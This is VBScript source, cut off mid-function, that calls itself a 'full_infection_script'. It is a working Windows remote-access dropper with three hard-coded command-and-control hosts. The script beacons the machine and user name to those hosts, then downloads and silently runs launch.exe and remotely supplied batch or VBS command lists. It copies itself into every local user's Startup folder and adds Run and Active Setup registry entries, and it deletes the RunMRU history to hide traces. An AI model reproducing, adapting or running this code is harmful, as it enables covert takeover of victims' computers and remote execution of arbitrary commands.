Option Explicit
On Error Resume Next

Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim WshShell : Set WshShell = CreateObject("WScript.Shell")
Dim objNetwork : Set objNetwork = CreateObject("WScript.Network")

Function XIsEmpty(str)
   
    XIsEmpty = False
    
    If IsNull(str) Or IsEmpty(str) Or Len(Trim(str)) = 0 Then
        XIsEmpty = True   
    End If
    
End Function

Function IsWScript()
    If InStr(LCase(WScript.FullName), "cscript.exe") Then
        IsWScript = false
    Else
        IsWScript = true
    End If
End Function

Function LogErr()
    If Err.Number = 0 Then
        Exit Function
    End IF
    
    Call LogMsg("Err.Number=" & Err.Number)
    Call LogMsg("Err.Description=" & Err.Description)
    Call LogMsg("Err.Source=" & Err.Source)
End Function

Function LogMsgMother(msg)
	' execute logmsg.php GET request to mothership /ow/logmsg.php
End Function

Function LogMsg(msg)
    
    If XIsEmpty(msg) Then
        Exit Function
    End If
    
    If Not IsWScript() Then
        WScript.Echo msg
    End If

    If Not logfObj is Nothing Then
        logfObj.WriteLine msg
    End If
    
End Function

Function GetProcessName(pid)
    Call LogMsg("GetProcessName: " & CStr(pid))
    
    GetProcessName = ""

    Dim list : Set list = GetProcessList()

    Dim i
    
    For i = 0 to list.Count
        Dim proc : proc = list.Item(i)
        
        if ( proc(1) = pid ) then
            GetProcessName = proc(0)
            Call LogMsg("GetProcessName: procname=" & GetProcessName)

            Exit Function
        End If
        
    Next
    
End Function

Function GetProcessList()
    Call LogMsg("GetProcessList")
    
    Dim list : Set list = CreateObject("Scripting.Dictionary")
    
    Set GetProcessList = list
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim colItems : Set colItems = objWMIService.ExecQuery("SELECT Name, ProcessId FROM Win32_Process") ' doesn't return all processes

    Dim i : i = 0

    Dim item
    For Each item In colItems
    
        Dim myArray : myArray = Array(item.Name, item.ProcessId)

        list.Add i, myArray

        i = i + 1
    Next

    Set GetProcessList = list
End Function

Function GetTimestamp()
    Dim d, ts
    d = Now
    ts = Year(d) & _
         Right("0" & Month(d), 2) & _
         Right("0" & Day(d), 2) & _
         Right("0" & Hour(d), 2) & _
         Right("0" & Minute(d), 2) & _
         Right("0" & Second(d), 2)

    GetTimestamp = ts
End Function

Function DownloadFile(sURL, sFile)
    DownloadFile = False
    On Error Resume Next
    Err.Clear
    
    If XIsEmpty(sURL) or XIsEmpty(sFile) Then
        Exit Function
    End If
    
    Call LogMsg("DownloadFile: " & sURL & " " & sFile & " " & GetTimestamp())

    Dim objHTTP, objStream
    
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Open "GET", sURL, False
    objHTTP.Send

    Call LogMsg("DownloadFile: " & objHTTP.Status & " " & objHTTP.StatusText )    
    
    If objHTTP.Status <> 200 Then
        Call LogMsg("DownloadFile: error: objHTTP.Status is not 200")
        Exit Function
    End If
    

    If XIsEmpty(objHTTP.ResponseBody) Then
        Call LogMsg("DownloadFile: ResponseBody is empty")
        Exit Function
    End If
    
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' adTypeBinary
    objStream.Open

    
    Dim allHeadersstr : allHeadersstr = objHTTP.getAllResponseHeaders() & vbCrLf
    Call LogMsg("DownloadFile: header: " & allHeadersstr)

    Dim count : count = UBound(objHTTP.ResponseBody) - LBound(objHTTP.ResponseBody) + 1

    Call LogMsg("DownloadFile: ResponseBody bytes: " & allHeadersstr)

    objStream.Write objHTTP.ResponseBody ' objHTTP.ResponseText    
    objStream.SaveToFile sFile, 2 ' adSaveCreateOverWrite (2) overwrites existing file
    
    If Err.Number <> 0 Then
        Call LogMsg("DownloadFile: Err.Number=" & Err.Number)
        Call LogMsg("DownloadFile: Err.Description=" & Err.Description)
        Call LogMsg("DownloadFile: Err.Source=" & Err.Source)
        
        Err.Clear 
    End If


    objStream.Close
    Set objStream = Nothing
    Set objHTTP = Nothing
    
    DownloadFile = true
End Function

Function URLEncode(ByVal str)
    URLEncode = ""
    
    If XIsEmpty(str) Then
        Exit Function
    End If
    
    Dim i, kchar, code, result
    result = ""
    
    For i = 1 To Len(str)
        kchar = Mid(str, i, 1)
        code = Asc(kchar)
        
        If (code >= 48 And code <= 57) Or _
           (code >= 65 And code <= 90) Or _
           (code >= 97 And code <= 122) Then
            result = result & kchar
        Else
            result = result & "%" & Hex(code)
        End If
    Next
    
    URLEncode = result
    
End Function

Function GetRandom(n)
    GetRandom = ""
    
    If n <= 0 Then
        Exit Function
    End If
    
    Randomize

    Dim min, max, randomNumber

    min = 10000000
    max = 99999999

    GetRandom = ""
    
    Do While Len(GetRandom) < n
        GetRandom = GetRandom & CStr(Int((max - min + 1) * Rnd + min))
    Loop

    GetRandom = Mid(GetRandom, 1, n)
End Function

Function IsEightDigitInteger(strValue)
    Dim regEx
    Set regEx = New RegExp
    ' Pattern: ^ (start), \d{8} (exactly 8 digits), $ (end)
    regEx.Pattern = "^\d{8}$"
    IsEightDigitInteger = regEx.Test(strValue)
End Function

Function Reset(fpath)
    
    If XIsEmpty(fpath) Then
        Exit Function
    End If

    Call LogMsg("Reset: " & fpath)
    
    fpath = Trim(fpath)
       
    Dim fileObj : Set fileObj = fso.CreateTextFile(fpath, True)
    
				  
 
    fileObj.Close
    Set fileObj = Nothing

									 
    Call RunShell("conhost.exe --headless cmd /c type nul > " & fpath, True)
		  
    
End Function

Function ReadFile(fpath)
    On Error Resume Next
    Err.Clear
    
    ReadFile = ""
    
    If XIsEmpty(fpath) Then
        Exit Function
    End If
    
    fpath = Trim(fpath)
    
    If Not fso.FileExists(fpath) Then
        Exit Function
    End If
    
    Dim objFile : set objFile = fso.OpenTextFile(fpath, 1)
    
    ReadFile = objFile.ReadAll

    objFile.Close
    Set objFile = Nothing
End Function

Function ReadTag(fpath)
    Call LogMsg("ReadTag " & fpath)

    ReadTag = ReadFile(fpath)
    
    ReadTag = Trim(ReadTag)
    ReadTag = Replace(ReadTag, " ", "")
    ReadTag = Replace(Replace(Replace(ReadTag, vbCr, ""), vbLf, ""), vbTab, "")    

    Call LogMsg("ReadTag " & ReadTag)
    
End Function

Function ReadMothership(fpath)
    ReadMothership = mothership
    
    If XIsEmpty(fpath) Then
        Exit Function
    End If
    
    fpath = Trim(fpath)
    
    If Not fso.FileExists(fpath) Then
        Exit Function
    End If
    
    Dim objFile : set objFile = fso.OpenTextFile(fpath, 1)
    
    ReadMothership = objFile.ReadLine

    ReadMothership = Replace(Replace(ReadMothership, vbCr, ""), vbLf, "")
    ReadMothership = Trim(ReadMothership)
        
   
    objFile.Close
    Set objFile = Nothing

End Function

Function ReadClientId(clientidpath)
    Dim objFile
    
    ReadClientId = "zzwwxxyy"
    
    If XIsEmpty(clientidpath) Then
        Exit Function
    End If
    
    clientidpath = Trim(clientidpath)
    
    If Not fso.FileExists(clientidpath) Then
        ReadClientId = GetRandom(8)
        
        set objFile = fso.OpenTextFile(clientidpath, 2, True)
        
        objFile.WriteLine(ReadClientId)
        
        objFile.Close
        
        Set objFile = Nothing
        
        Exit Function
    End If
    
    set objFile = fso.OpenTextFile(clientidpath, 1)
    
    Dim clientidstr : clientidstr = objFile.ReadLine

    clientidstr = Replace(Replace(clientidstr, vbCr, ""), vbLf, "")
    clientidstr = Trim(clientidstr)
        
    If IsEightDigitInteger(clientidstr) Then
        ReadClientId = CStr(clientidstr)
    End If
    
    objFile.Close
    Set objFile = Nothing
End Function

Function ExecShellAsync(cmdstr)
    
    If XIsEmpty(cmdstr) Then
        Exit Function
    End If
    
    Call LogMsg("ExecShell: " & cmdstr)
    
    Const HIDDEN_WINDOW = 0
    Dim strComputer : strComputer = "."
    Dim strCommand: strCommand = cmdstr

    Dim objWMIService: Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

    Dim objStartup: Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Dim objConfig: Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW

    Dim objProcess: Set objProcess = objWMIService.Get("Win32_Process")

    Dim intPID
    Dim intReturn : intReturn = objProcess.Create(strCommand, Null, objConfig, intPID)

    If intReturn = 0 Then
        Call LogMsg("Process started successfully. PID: " & intPID)
    Else
        Call LogMsg("Process failed to start with error code: " & intReturn)
    End If

    ExecShellAsync = intPID
End Function

Function RunShell(cmdstr, sync)
    On Error Resume Next
    Err.Clear
    
    If XIsEmpty(cmdstr) Then
        Exit Function
    End If
    
    Call LogMsg("runshell: " & cmdstr)
             
    
    Dim intReturn : intReturn = WshShell.Run(cmdstr, 0, sync)

    Call LogMsg("runshell: intReturn: " & CStr(intReturn))

    If Err.Number <> 0 Then
        Call LogMsg("runshell: Err.Number: " & Err.Number)
        Call LogMsg("runshell: Err.Source: " & Err.Source)
        Call LogMsg("runshell: Err.Description: " & Err.Description)

        Err.Clear
    End If


    If intReturn = 0 Then
        RunShell = true
    Else
        RunShell = false
    End If
End Function

Function ToTaskTime(startTime)
    
    ' Dim startTime : startTime = Now
    
    ToTaskTime = Year(startTime) & "-" & _
        Right("0" & Month(startTime), 2) & "-" & _
        Right("0" & Day(startTime), 2) & "T" & _
        Right("0" & Hour(startTime), 2) & ":" & _
        Right("0" & Minute(startTime), 2) & ":00"
        
End Function

Function CreateTaskXML(taskname, taskxmlpath)
    
    If XIsEmpty(taskname) Then
        Exit Function
    End IF

    If XIsEmpty(taskxmlpath) Then
        Exit Function
    End IF
    
    Call LogMsg("CreateTaskXML: " & taskname & " " & taskxmlpath)
    
    Dim strCommand : strCommand = "schtasks /create /XML " & dq & taskxmlpath & dq  &" /tn " & dq & taskname & dq & " /F"
    
    Dim ret : ret = RunShell(strCommand, True)

    Call LogMsg("CreateTaskXML: ret: " & CStr(ret))

    CreateTaskXML = ret
End Function

Function GetScripTag()
    Dim objDict : Set objDict = CreateObject("Scripting.Dictionary")

    objDict.Add "clientid", clientid
    objDict.Add "script_version", script_version
    objDict.Add "source", source
    objDict.Add "scriptts", scriptts
    objDict.Add "machinename", machinename
    objDict.Add "username", username
    
    Set GetScripTag = objDict
End Function

Function GetScripTagStr()
    GetScripTagStr = ""
    
    Dim scripttag : Set scripttag = GetScripTag()
    
    Dim keys : keys = scripttag.Keys
    Dim strKey

    For Each strKey In keys
        GetScripTagStr = GetScripTagStr & "[" & strKey & "]=[" & scripttag.Item(strKey) & "]|"
    Next

End Function

Function GetScripTagStrUrl()
    GetScripTagStrUrl = ""
    
    Dim scripttag : Set scripttag = GetScripTag()
    
    Dim keys : keys = scripttag.Keys
    Dim strKey

    For Each strKey In keys
        GetScripTagStrUrl = GetScripTagStrUrl & "&" & URLEncode(strKey) & "=" & URLEncode(scripttag.Item(strKey))
    Next

End Function

Function GetScriptPID()
    GetScriptPID = -1
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim WshShell : Set WshShell = CreateObject("WScript.Shell")

    Dim strUniqueTitle : strUniqueTitle = "GetPID_" & Timer()
    Dim strCommand : strCommand = "cmd /c title " & strUniqueTitle & " & timeout 5"

    wshShell.Run strCommand, 0, False
    WScript.Sleep 100 

    Dim strQuery : strQuery = "SELECT ParentProcessId FROM Win32_Process WHERE CommandLine LIKE '%" & strUniqueTitle & "%'"
    Dim colItems : Set colItems = objWMIService.ExecQuery(strQuery)

    Dim objItem
    For Each objItem In colItems
        GetScriptPID = objItem.ParentProcessId
    Next

End Function

Function GetLocalUsers()
    GetLocalUsers = ""
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim colItems : Set colItems = objWMIService.ExecQuery("Select * from Win32_UserAccount Where LocalAccount = True")

    Dim isempty : isempty = False
    
    If colItems Is Nothing Then
        isempty = True
    ElseIf colItems.Count = 0 Then
        isempty = True
    End IF
    
    If isempty Then
        Exit Function
    End IF
    
    Dim objItem
    For Each objItem in colItems
        GetLocalUsers = GetLocalUsers & objItem.Name & "|"
    Next

End Function

Function FileExists(dirpath, fname)
    FileExists = False
    
    If fso.FolderExists(dirpath) Then
        Dim folder : Set folder = fso.GetFolder(dirpath)
        
        Dim file
        For Each file In folder.Files 
            If LCase(file.Name) = LCase(fname) Then
                FileExists = True
                Exit Function
            End If
        Next
        
    End If
    
End Function

Function WriteFile(fpath, msgstr)
    If XIsEmpty(msgstr) Then
        msgstr = ""
    End If
    
    Const ForWriting = 2
    Const CreateIfNotExist = True

    Dim oFile : Set oFile = fso.OpenTextFile(fpath, ForWriting, CreateIfNotExist)

    oFile.Write msgstr

    oFile.Close
    Set oFile = Nothing

End Function

Function SelectMothership()
    Call LogMsg("SelectMothership")

    Randomize
    Dim randomNumber : randomNumber = Int((100 * 1 + 1) * Rnd + 1)
    
    If randomNumber <= 33 Then
        SelectMothership = mothershipbackup
    Elseif randomNumber > 33 and randomNumber <= 66 Then
        SelectMothership = mothershipping
    Else
        SelectMothership = mothershipmaster
    End If

    Call LogMsg("SelectMothership: randomNumber: " & CStr(randomNumber) & " " & SelectMothership)

End Function

' --- BEGIN: globals static initialization

Dim dq : dq = Chr(34)
Dim tempPath : tempPath = fso.GetSpecialFolder(2)

Dim mothershipmaster : mothershipmaster = "https://seashell-raven-793508.hostingersite.com"
Dim mothershipping : mothershipping = "http://s1083932807.online-home.ca"
Dim mothershipbackup : mothershipbackup = "https://darksalmon-crow-356809.hostingersite.com"
Dim mothership : mothership = mothershipmaster

                               

Dim cmdslist : cmdslist = Array("ping", "cmdlist", "watchdog", "retrieve", "penetrate", "reschedule", "upgrade", "execonecmd", "execvbs" )

Dim cmdname : cmdname = ""

If WScript.Arguments.Count > 0 Then
    cmdname = WScript.Arguments(0)
End If

Dim cmdtaskname : cmdtaskname = ""
If cmdname = "task" Then
    If WScript.Arguments.Count > 1 Then
        cmdtaskname = WScript.Arguments(1)
    End If
End IF

Dim scriptts : scriptts = GetTimestamp()
Dim clientid : clientid = "abcdwxyz"
Dim source : source = WScript.ScriptName
Dim scriptpath : scriptpath = WScript.ScriptFullName
Dim machinename : machinename = "LOCALHOST"
Dim username : username = "UNKNOWNUSER"
Dim script_version : script_version = "full_infection_script"

If Not objNetwork Is Nothing Then
    machinename = objNetwork.ComputerName
    username = objNetwork.UserName
End If

If WScript.Arguments.Count = 0 Or XIsEmpty(cmdname) Then
    Dim apos : apos = InStr(source, "_") 
    Dim bpos : bpos = InStr(source, ".") 
    
    If ( ( bpos > apos) and ( apos > 0 ) ) Then
        cmdname = Mid(source, apos+1, bpos-apos-1)
    End If
End If

If XIsEmpty(cmdname) Then
    cmdname = "init"
End IF

Dim tskname : tskname="OWD_retry_infection_vbs"
Dim cmdlistdelaytime : cmdlistdelaytime=30
Dim pingdelaytime : pingdelaytime=30
Dim watchdogtimedelay : watchdogtimedelay=30
Dim tskxmltime : tskxmltime=90 
Dim timetaskxmltime : timetaskxmltime=90

Dim workdir : workdir = tempPath & "\" & "owd" 
Dim exepath : exepath = workdir & "\" & "launch.exe"

Dim istpl : istpl = false 
If LCase(Mid(script_version,1,3)) = "tpl" Or LCase(Mid(machinename, 1, 5)) = LCase("RLPCP") Then
    istpl = True
    
    script_version = "tpl_full_infection_script"
    workdir = "C:\ProgramData\OWD"
    tskxmltime = 15
    timetaskxmltime = 5

    exepath = workdir & "\" & "tpl_launch.exe"

End IF

Dim logfpath: logfpath = workdir & "\" & "master_" & cmdname & "_" & scriptts & ".log"
Dim logfObj : Set logfObj = fso.OpenTextFile(logfpath, 8, True)

' --- END

Function TryCopyFile(srcpath, destpath)

    If XIsEmpty(srcpath) or XIsEmpty(destpath) Then
        Exit Function
    End IF
    
    Call LogMsg("TryCopyFile: " & srcpath & " " & destpath)
        
    If Not fso.FileExists(destpath) Then
        fso.CopyFile srcpath, destpath, True
    End IF    
    
    If Not fso.FileExists(destpath) Then
        Call RunShell("conhost.exe --headless cmd /c copy /y " & srcpath & " " & destpath,True)
    End IF

End Function

Function TryDeleteFile(fpath)
    Call LogMsg("TryDeleteFile: " & fpath)
    
    If fso.FileExists(fpath) Then
        fso.DeleteFile fpath, true
    End If
    
    If fso.FileExists(fpath) Then
        Call RunShell("conhost.exe --headless cmd /c del /F /Q " & fpath, True)
    End If
    
End Function

Function Init()
    On Error Resume Next
    Err.Clear
    
    Call LogMsg("Init")
    
    If XIsEmpty(cmdname) Then
        Call LogMsg("fatal error -- cmdname is empty -- exiting")
        WScript.Quit(1)
    End IF

    mothership = SelectMothership()
    
    clientid = ReadClientId(workdir & "\" & "client_id")
    
    Call LogMsg("starting source=" & source & " cmdname=" & cmdname & " cmdtaskname=" & cmdtaskname & " clientid=" & clientid & " mothership=" & mothership & " -- " & scriptts )

    If Not fso.FolderExists(workdir) Then
        fso.CreateFolder(workdir)
    End If

    WshShell.CurrentDirectory = workdir

    If Not fso.FileExists(workdir & "\zfei.vbs") Then
        fso.CopyFile scriptpath, workdir & "\zfei.vbs", True
    End If    
    
    Call RunShell("conhost.exe --headless cmd /c schtasks /delete /TN t /F", true)
    Call RunShell("conhost.exe --headless cmd /c schtasks /delete /TN " & tskname & "_repx" & " /F", true)
    
    If cmdname = "init" or cmdname = "task" Then
     
        StartupLogic()
        
        Call LogMsg("init finished -- exiting")
        WScript.Quit(0)
    End If
    
    
    If InStr(LCase(Join(cmdslist)), LCase(cmdname)) >= 1 Then
        Dim func : Set func = GetRef(cmdname)
        
        func()
    End If

    Call LogMsg("exiting")
    WScript.Quit(0)
    
End Function

Init()

Call LogErr()
Call LogMsg("fatal error -- reached unreachable point -- exiting")
WScript.Quit(1)

' --------

Function Watchdog() 
    cmdname = "watchdog"

    ForceSingleton()
    
    Do While True   
    
        Call LogMsg("Watchdog: " & GetTimestamp())        
    
    Do While True
    
        Call ExitRamp("watchdog")

        Call Activate()        

        Exit Do
    
    Loop

        Call LogMsg("Watchdog sleeping for " & CStr(watchdogtimedelay) & " seconds " & GetTimestamp() )
        
        WScript.Sleep watchdogtimedelay*1000

    Loop
    
End Function

' retrieve pcmon and pcmon ps1 script
Function Retrieve()
    cmdname = "retrieve"

    Call LogMsg("Retrieve")
    
    Dim files 
    
    ' add pcmon and ps_monitoring ps1
    if istpl Then
        files = Array("tpl_launch.exe")    
    else
        files = Array("launch.exe")
    end If
    
    Dim file
    For Each file in files
        Call LogMsg("Retrieve: " & file)

        Dim url: url = mothership & "/ow/assets/" & file
        Dim localpath : localpath = workdir & "\" & file
        
        If Not fso.FileExists(localpath) Then
            Call DownloadFile(url, localpath)
        End If

        If Not fso.FileExists(localpath) Then
            RunShell("conhost.exe --headless cmd /c curl -kso " & localpath & " -G " & dq & url & dq)
        End If

    
    Next
    
End Function

Function PenetrateTpl()
    
    Call LogMsg("PenetrateTpl")

    ' exe execution results in "Access Denied" in tpl
    WScript.Quit(0)

    Dim startuppath 
    
    startuppath = "C:\ProgramData\MandatoryProfile\Mandatory.V6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    
    If fso.FileExists(exepath) Then
        Call LogMsg("PenetrateTpl: copying to " & startuppath)

        Call TryCopyFile(exepath,startuppath)        
    End If

    startuppath = "C:\Users\All Users\MandatoryProfile\Mandatory.V6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    
    If fso.FileExists(exepath) Then
        Call LogMsg("PenetrateTpl: copying to " & startuppath)

        Call TryCopyFile(exepath,startuppath)
    End If

    Call LogMsg("exiting")
    WScript.Quit(0)
    
End Function

Function Penetrate() 
    cmdname = "penetrate"
  
    Call LogMsg("Penetrate " & GetTimestamp())
    
    If istpl Then
        PenetrateTpl()
        
        Call LogMsg("exiting")
        
        WScript.Quit(0)
    End IF
        
    Dim localusers : localusers = GetLocalUsers()
    
    localusers = Split(localusers, "|")
    
    Dim username
    For Each username In localusers
        Dim startuppath
            
        startuppath = "C:\Users\" & username & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

        Call LogMsg("Penetrate: setting up " & username & " " & startuppath)
       
        If Not fso.FileExists(exepath) Then
            WScript.Sleep 3000
        End If
        
        Call TryCopyFile(exepath, startuppath)        
    Next
    
    Dim cmdstr : cmdstr = ""
    cmdstr = "REG ADD " & dq & "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" & dq 
    cmdstr = cmdstr & " /v " & tskname & " /t REG_SZ /d " & exepath & " /f"
    
    Call RunShell(cmdstr, True)
    
    Dim regpath : regpath = dq & "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\" & tskname & dq
    
    cmdstr = "REG ADD " & regpath & " /f"
    Call RunShell(cmdstr, True)

    cmdstr = "REG ADD " & regpath & " /v " & dq & "StubPath" & dq & " /d " & dq & exepath & dq & " /t REG_SZ /f"
    Call RunShell(cmdstr, True)

    cmdstr = "REG ADD " & regpath & " /v " & dq & "Version" & dq & " /d " & dq & "1" & dq & " /t REG_SZ /f"
    Call RunShell(cmdstr, True)

    cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
    Call RunShell(cmdstr, True)
    
    Call LogMsg("exiting")
    WScript.Quit(0)
    
End Function

Function ForceSingleton()
    Call LogMsg("ForceSingleton: starting")
    
    Dim scriptpid : scriptpid = GetScriptPID()
    
    Dim scriptprocname : scriptprocname = GetProcessName(scriptpid)
    
    Call LogMsg("ForceSingleton: scriptpid=" & scriptpid)
     
    Dim tagname : tagname = cmdname & "_running"
    
    If Not fso.FileExists(workdir & "\" & tagname) Then
        Call LogMsg("ForceSingleton: writing to running file")

        Dim objFile : Set objFile = fso.OpenTextFile(workdir & "\" & tagname, 2, True)

        objFile.Write CStr(scriptpid)
        objFile.Close
        Set objFile = Nothing
        
        Exit Function
    Else
        Call LogMsg("ForceSingleton: running file exists")

        Dim procname : procname = ""
        Dim pid : pid = IsCmdRunning(cmdname, procname)

        ' procname should be cscript.exe
        Call LogMsg("ForceSingleton -- found cmd running with pid=" & CStr(pid) & " procname=" & procname)
        
        If pid > 0 and scriptpid <> pid Then
            Call LogMsg("ForceSingleton: duplicate found -- exiting")
            WScript.Quit(1)
        End If
                
    End If
    
End Function

Function ExitRamp(tcmdname)
    Call LogMsg("ExitRamp")
    
    If fso.FileExists(workdir & "\" & "killall") Then
        Call LogMsg("kill all found -- exiting")
        WScript.Quit(1)
    End If

    Dim resetfname : resetfname = workdir & "\" & "reset_" & tcmdname & "loop"
    
    IF fso.FileExists(resetfname) Then
        Call TryDeleteFile(resetfname)
        
        Call LogMsg("reset found -- exiting")
        WScript.Quit(1)
    End If

End Function

Function ProcessExecCmd(inpingstr)
	
	If XIsEmpty(inpingstr) Then
		Exit Function
	End IF
	
	Call LogMsg("ProcessExecCmd")

	' EXEC_CMD_BEGIN|jobcode|<cmdname>|arg1|arg2|...|argn|EXEC_CMD_END

	Dim begin_token : begin_token = "EXEC_CMD_BEGIN"
    Dim end_token : end_token = "EXEC_CMD_END"
    
    Dim start_position : start_position = InStr(1, inpingstr, begin_token, 1)
    Dim end_position : end_position = InStr(1, inpingstr, end_token, 1)        

    if ( start_position <= 0 ) Then
		Call LogMsg("ProcessExecCmd -- EXEC_CMD_BEGIN tag not found in ping txt -- exiting function")
        Exit Function
    end if
    
    start_position = start_position + Len(begin_token)
    
    if ( end_position <= 0 ) or ( start_position >= end_position ) Then
		Call LogMsg("ProcessExecCmd -- ERROR:: EXEC_CMD_BEGIN tag found but end tag is misplaced -- exiting function")
		Exit Function
    End if
    
    Dim argstr : argstr = Mid(inpingstr, start_position, end_position-start_position)
    
    If XIsEmpty(argstr) Then
		Call LogMsg("ProcessExecCmd -- ERROR:: EXEC_CMD_BEGIN arg string is empty -- exiting function")
        Exit Function
    End If

	Call LogMsg("ProcessExecCmd -- arg string=" & argstr)
    
    Dim argarr : argarr = Split(argstr, "|")

    If IsArray(argarr) Then
        If UBound(argarr) = -1 Then
			Call LogMsg("ProcessExecCmd -- ERROR:: problem 1 with arg string array -- exiting function")
            Exit Function
        End If
    Else
		Call LogMsg("ProcessExecCmd -- ERROR:: problem 2 with arg string array -- exiting function")

        Exit Function
    End If

    Dim argarrlen : argarrlen = UBound(argarr) + 1
	
	Call LogMsg("ProcessExecCmd -- arg count=" & CStr(argarrlen))

	If ( argarrlen <= 2 ) Then 
		Call LogMsg("ProcessExecCmd -- ERROR :: there must be at least 2 args to execute command, jobcode and cmdname -- exiting function")
		Exit Function
	End IF
	
	Dim jobcode : jobcode = argarr(0)
	Dim exec_cmdname : exec_cmdname = argarr(1)
	
	Call LogMsg("ProcessExecCmd -- exec_cmdname=" & exec_cmdname & " JobCode=" & jobcode)

	IF LCase(exec_cmdname) = "upgrade" then
		Dim retresult : retresult = Upgrade()
		
		' write even to bus with result
		If ( retresult = -1 ) then
			' failed
		else
			' success
		End IF
		
		Exit Function
	End If
	
	Dim i, newargarr
	
	ReDim newargarr(argarrlen - 1)

	For i = 2 To argarrlen-1
		newargarr(i - 1) = argarr(i)
	Next
	
End Function

Function Ping()
    cmdname = "ping"

    ForceSingleton()
    
    Dim pingpath : pingpath = workdir & "\" & "ping.txt"
    
    Do While True
        
        Call LogMsg("running ping mothership=" & mothership & " " & GetTimestamp() )

        Call WriteFile( workdir & "\" & "mothership", mothership )

    Do While True  

        Call ExitRamp(cmdname)

        Call Reset(pingpath)
                
        Dim params : params = GetScripTagStrUrl()
        params = Mid(params, 2, Len(params)-1)

        Dim url : url = mothership & "/ow/ping.php?" & params
        
        Call RunShell("conhost.exe --headless cmd /c curl -ks -o " & pingpath & " " & url, True)

        Dim iserr : iserr = false
        Dim pingtxt
        
        If Not fso.FileExists(pingpath) Then
            Call LogMsg("ERROR -- ping.txt does not exist")
            iserr = true
        Else
            pingtxt = ReadFile(pingpath)
            
            If XIsEmpty(pingtxt) Then
                Call LogMsg("ERROR -- pingtxt is empty")
                iserr = true
            Elseif InStr(pingtxt, "CLIENT") = 0 Then
                Call LogMsg("ERROR -- pingtxt did not contain string CLIENT")
                iserr = true
            Else
                Call LogMsg("pingtxt: " & pingtxt)
            End If
            
        End IF

        If iserr Then
            mothership = SelectMothership()
            Call LogMsg("changing mothership: " & mothership)
            
            Call WriteFile( workdir & "\" & "mothership", mothership )
            
            Exit Do
        End If

		Call ProcessExecCmd(pingtxt)
        
        Exit Do
    
	
    Loop
    
    
        Call LogMsg("ping sleeping " & CStr(pingdelaytime) & " seconds " & GetTimestamp() )

        WScript.Sleep pingdelaytime*1000

        Randomize
        Dim trandomNumber : trandomNumber = Int((10 * Rnd) + 1)        
        Dim sleeptime : sleeptime = trandomNumber*5
        
        Call LogMsg("ping sleeping for an additional " & CStr(sleeptime) & " seconds")

        WScript.Sleep sleeptime*1000

    Loop
    
End Function

Function Cmdlist()
    cmdname = "cmdlist"
    
    ForceSingleton()

    Do While True
        
        mothership = ReadMothership( workdir & "\" & "mothership" )
        
        Call LogMsg("cmdlist mothership=" & mothership & " starting " & GetTimestamp() )

    Do While True   

        Call ExitRamp("cmdlist")
    
        Dim execcmdlist : execcmdlist = false

        If Not fso.FileExists(workdir & "\" & "ping.txt") Then
            Exit Do
        End If
        
        Call LogMsg("cmdlist: found ping.txt" )

        Dim objFile : Set objFile = fso.OpenTextFile(workdir & "\" & "ping.txt", 1)
        
        Dim strFileContent : strFileContent = ""
        
        If Not objFile.AtEndOfStream Then
            strFileContent = LCase(objFile.ReadAll)
        End If
        
        objFile.Close
        Set objFile = Nothing
        
        If XIsEmpty(strFileContent) Then
            Call LogMsg("Cmdlist - ping is empty")

            Exit Do
        End If            

        Call LogMsg("cmdlist - ping file size: " & Len(strFileContent) )

        If InStr(strFileContent, "execute_cmdlist") > 0 Then
            Call LogMsg("cmdlist - found execcmdlist" )

            execcmdlist = True
        End If

        Call LogMsg("cmdlist: reseting ping.txt" )

        Call RunShell("conhost.exe --headless cmd /c type nul > " & workdir & "\" & "ping.txt", True)
        Reset(workdir & "\" & "ping.txt")
        
        If Not execcmdlist Then
            Exit Do
        End If

        Call LogMsg("cmdlist - downloading bbti.bat" )
     
        Dim filepath : filepath = workdir & "\" & "bbti.bat"
        
        Call RunShell("conhost.exe --headless cmd /c type nul > " & filepath, True)
        Call RunShell("conhost.exe --headless cmd /c del /F /Q " & filepath, True)
                
        Dim url : url = mothership & "/ow/retrieve.php?filename=cmd_list.bat" & GetScripTagStrUrl()
        
        Call DownloadFile( url, filepath )

        If fso.FileExists( filepath ) Then 
            Call LogMsg("cmdlist - running bbti.bat" )

            Dim filext : filext = fso.GetExtensionName(filepath)

            If LCase(filext) = "bat" Then
                Call RunShell("conhost.exe --headless cmd /c " & filepath & " > " & workdir & "\" & "bbti.bat_cmds.log", false)
            ElseIf LCase(filext) = "vbs" Then
                Call RunShell("conhost.exe --headless cscript.exe //nologo //B " & filepath, false)
            End If
        End If
        
        Exit Do
    Loop
    

        Call LogMsg("cmdlist sleeping " & CStr(cmdlistdelaytime) & " seconds " & GetTimestamp() )

        WScript.Sleep cmdlistdelaytime*1000
    
    Loop
    
End Function

Function Pcmon()
    cmdname = "pcmon"

    ForceSingleton()

    Do While True
        
        mothership = ReadMothership( workdir & "\" & "mothership" )
        
        Call LogMsg("pcmon mothership=" & mothership & " starting " & GetTimestamp() )

    Do While True   

        Call ExitRamp("cmdlist")
    
        Dim execcmdlist : execcmdlist = false

        If Not fso.FileExists(workdir & "\" & "ping.txt") Then
            Exit Do
        End If
        
        Call LogMsg("cmdlist: found ping.txt" )

        Dim objFile : Set objFile = fso.OpenTextFile(workdir & "\" & "ping.txt", 1)
        
        Dim strFileContent : strFileContent = ""
        
        If Not objFile.AtEndOfStream Then
            strFileContent = LCase(objFile.ReadAll)
        End If
        
        objFile.Close
        Set objFile = Nothing
        
        If XIsEmpty(strFileContent) Then
            Call LogMsg("Cmdlist - ping is empty")

            Exit Do
        End If            

